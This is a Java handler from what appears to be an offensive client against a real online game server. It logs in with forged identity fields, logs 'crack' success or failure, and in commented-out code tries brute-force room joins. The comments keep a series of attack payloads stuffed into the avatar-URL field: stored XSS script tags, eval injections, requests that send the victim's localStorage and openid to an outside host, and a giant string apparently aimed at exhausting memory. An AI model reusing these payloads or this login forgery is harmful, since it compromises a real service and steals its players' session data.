package io.gamioo.pomelo;

import com.zvidia.pomelo.websocket.OnHandshakeSuccessHandler;
import com.zvidia.pomelo.websocket.PomeloClient;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * some description
 *
 * @author Allen Jiang
 * @since 1.0.0
 */
public class GameHandshakeSuccessHandler implements OnHandshakeSuccessHandler {
    private static final Logger LOGGER = LogManager.getLogger(GameHandshakeSuccessHandler.class);
    private GameClient gameClient;
    private String signData;
    private String openId;

    private OpenIdService service;
    private String ip;

    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public String getOpenId() {
        return openId;
    }

    public void setOpenId(String openId) {
        this.openId = openId;
    }

    public String getSignData() {
        return signData;
    }

    public void setSignData(String signData) {
        this.signData = signData;
    }

    public void init(GameClient client) {
        this.gameClient = client;
        service = new OpenIdService();
    }

    @Override
    public void onSuccess(PomeloClient client, JSONObject jsonObject) {

        this.gameClient.hearBeat();
        // while (true) {
        try {
            JSONObject entity = new JSONObject();
            String id = service.generateId();
            //    entity.put("_id", id);
            //   entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");
            entity.put("_id", openId + "@ll2020");

            //oR9cD1lM5cuXYI-P6nhEE0rFLz40
            //  entity.put("_id", "oxmtuw2bSnGwlEC-IZGs7ftrvFaM@ll2020");
            // entity.put("_id", "oxmtuw8bSnGwlEC-IZGs7ftrvFaM@ll2020");


            //   entity.put("_id", "oxmtuw5BSnGwlEC-IZGs7ftrvFaM@ll2020");
            //   entity.put("_id", "oxmtuw_2GQXpDC5Ox9UhJxOBGznJM@ll2020");

            // entity.put("_id", "oxmtuw_GQXpDC5Ox9UhJxOBGznJM@ll2020");

            // entity.put("name", "鱼香Rose");
            //  entity.put("name", "\\u963f\\u9f99");
            entity.put("name", "\\u20\\u20\\u20\\u20\\u20");//名字可以改
            //  entity.put("name", "\\u20\u1be4\u2075\u1d4d\\u28\ud83d\udcad");
            //  entity.put("name", "\u963f\u9f99\\u20\u1be4\u2075\u1d4d\\u20\ud83d\udcad");
            //     entity.put("name", "鱼香Rose");
            entity.put("sex", "1");
            //  String value = RandomStringUtils.random(99999999, " ");
            //           StringBuilder sb = new StringBuilder();
            // for (int i = 0; i < 15999999; i++) {
//            for (int i = 0; i < 199999999; i++) {
//                sb.append(" ");
//            }
//            //   String value = RandomStringUtils.randomAlphanumeric(99999999);
//            String value = MessageFormat.format("https://thirdwx.qlogo.cn/mmopen/vi_32/{0}/132", sb.toString());
//            entity.put("headurl", value);
//                eval("("+req.query.input+")");
//
//                console.log("spreadid:", "eval(console.debug(GlobalData.openid))")

            //   entity.put("headurl", "eval(\"console.debug(GlobalData.openid)\")");


            //  entity.put("headurl", "<script>var httpRequest = new XMLHttpRequest();httpRequest.open('GET', 'https://game.guanl.cn/132.jpg', true);httpRequest.send();</script>");
            // entity.put("headurl", "<script>alert(localStorage.getItem('ll2020openiddata2022'))</script>");
            //  entity.put("headurl", "'https://game.guanl.cn/9527/router/wechat/login.do?invitorId=188786&id='+egret.localStorage.getItem('ll2020openiddata2022')");
            //  entity.put("headurl", "https://game.guanl.cn/132.jpg");
            // entity.put("headurl", "https://game.guanl.cn/9527/router/wechat/login.do?jwt=JSON.stringify(localStorage)");
            //  entity.put("headurl", "?redirect_uri=https://163.com/login.do?jwt=+JSON.stringify(localStorage)");
            //   entity.put("headurl", "https://game.guanl.cn/router/common/exception.do?userId=0&detail=<script>xmlHttp = new XMLHttpRequest; xmlHttp.open('GET','https://game.guanl.cn/c.png',false); xmlHttp.send(); console.log(xmlHttp.responseText);</script>");


            entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/y6E5GpvgQicwocia23oqIibpWBqEbCgny2JGsrAaCK1xSSPQbCXOzBZjN9iboicCqnQ1SHB3943qYZHibSWqAUpHdZ4A1/132");
            //  entity.put("headurl", "https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIrj8pKz1TFag7p4jz5AB7eialLmxHLiaC4xv2jw05aDkJo5W6iarBnEahS0nBJt9DwI6F2dEicGsG2xA/132");


            entity.put("agentId", "341168");//这个可以改
            entity.put("formId", 3);
            entity.put("verison", "151");//每次版本更新都要改
            entity.put("ip", ip);
            entity.put("dis", 0);
            entity.put("smslogon", 0);
            entity.put("protocol", "https://");
            entity.put("hostname", "lele8k.game1617.com");
            entity.put("connectIP", "lele8k.game1617.com");
            //  entity.put("passname", "31376101647185013682");


            //  entity.put("signname", "1647615887368.87");
            entity.put("signname", "ll2020");

            // entity.put("signname", this.signName);
            entity.put("signData", signData);
            entity.put("wsId", 2);
            client.request("connector.entryHandler.login", entity.toString(), message -> {
                JSONObject object = message.getBodyJson();
                int code = object.getInt("code");
                if (code == 200) {
                    LOGGER.debug("user={}", object);
                    //  LOGGER.debug("破解成功 id={}", id);

                    int userId = object.getJSONObject("data").getJSONObject("player").getInt("userId");

                    LOGGER.debug("userId={}", userId);
                    gameClient.joinRoom(GameType.COMMON, 621740);
                } else {
                    LOGGER.debug("破解失败 id={}", id);
                }


//                String prefix = "1819";
//                for (int i = 10; i < 100; i++) {
//                    if (!gameClient.isRoom()) {
//                        int roomId = Integer.parseInt(prefix + i);
//                        LOGGER.debug("尝试进入房间 roomId={}", roomId);
//                        gameClient.joinRoom(GameType.COMMON, roomId);
//                    } else {
//                        break;
//                    }
//
//                }

                //   gameClient.getUserInfo(373082);
                //  flag = true;


            });
        } catch (JSONException e) {
            LOGGER.error(e.getMessage(), e);
            this.gameClient.setFlag(true);

        }

        //   }

    }
}
